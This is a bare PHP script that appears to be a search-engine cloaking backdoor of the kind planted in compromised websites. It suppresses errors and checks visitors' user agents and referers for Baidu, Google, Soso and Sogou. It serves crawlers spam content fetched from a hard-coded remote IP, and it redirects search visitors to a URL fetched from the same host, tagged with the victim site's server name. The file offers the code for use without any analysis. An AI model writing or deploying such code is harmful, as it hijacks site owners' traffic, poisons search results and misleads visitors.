<?php
@error_reporting (E_ALL & ~E_NOTICE & ~E_WARNING);
ini_set('display_errors',0);

$spider_arr = array(
	'baiduspider',
	'baiduspider/2.0',
	'baiducustomer',
	'baidu-thumbnail',
	'baiduspider-mobile-gate',
	'baiduspider-mobile-gate',
	'baidu-transcoder/1.0.6.0',

	'googlebot/2.1',
	'googlebot-image/1.0',
	'feedfetcher-google',
	'mediapartners-google',
	'adsbot-google',
	'googlebot-mobile/2.1',
	'googlefriendconnect/1.0',

	'sosospider',
	'sosoblogspider',
	'sosoimagespider',

	'sogou web robot',
	'sogou web spider/3.0',
	'sogou web spider/4.0',
	'sogou head spider/3.0',
	'sogou-test-spider/4.0',
	'sogou orion spider/4.0',
);

$not_spider_ip_arr = array(
	"222.77.187.33",
	"125.90.88.96"
);

$ref_arr = array(
    'baidu.com',
    'google.com'
);

$agent = $_SERVER['HTTP_USER_AGENT'];
$rip = $_SERVER["REMOTE_ADDR"];
$referer = $_SERVER["HTTP_REFERER"];

$spider = false;
foreach($spider_arr as $_spider) {
	if(stripos($agent,$_spider) !== false) {
		$spider = true;
		break;
	}
}

if(in_array($rip,$not_spider_ip_arr)) {
	$spider = false;
}

$ref = false;
foreach($ref_arr as $_ref) {
	if(stripos($referer,$_ref) !== false) {
		$ref = true;
		break;
	}
}

$query_string=$_SERVER["HTTP_REFERER"]; 
function isSpider($v)
{
		$spiders=array("baidu.com","google.com","soso","sogou");
		$i=0;
		foreach ($spiders as $i => $value) {
			if(stristr($v,$spiders[$i])){return true;}
		}
		return false;
}
	if(isSpider($_SERVER['HTTP_REFERER']))
	{
       
if(stristr($_SERVER["HTTP_REFERER"],'%d6%ef%cf%c9')) {
$url=file_get_contents('http://113.107.95.66:88/php/zx.txt');
Header("Location:$url".'?'.$_SERVER['SERVER_NAME']);
exit;
}

}

if(array_key_exists('key',$_GET)&&$ref) {
	$xt = trim($_GET['key']);
$url=file_get_contents('http://113.107.95.66:88/php/zx.txt');
Header("Location:$url".'?'.$_SERVER['SERVER_NAME']);
exit;
}
if($spider) {
$cjurl=file_get_contents('http://113.107.95.66:88/caiji/zx.txt');
echo file_get_contents($cjurl);
}
?>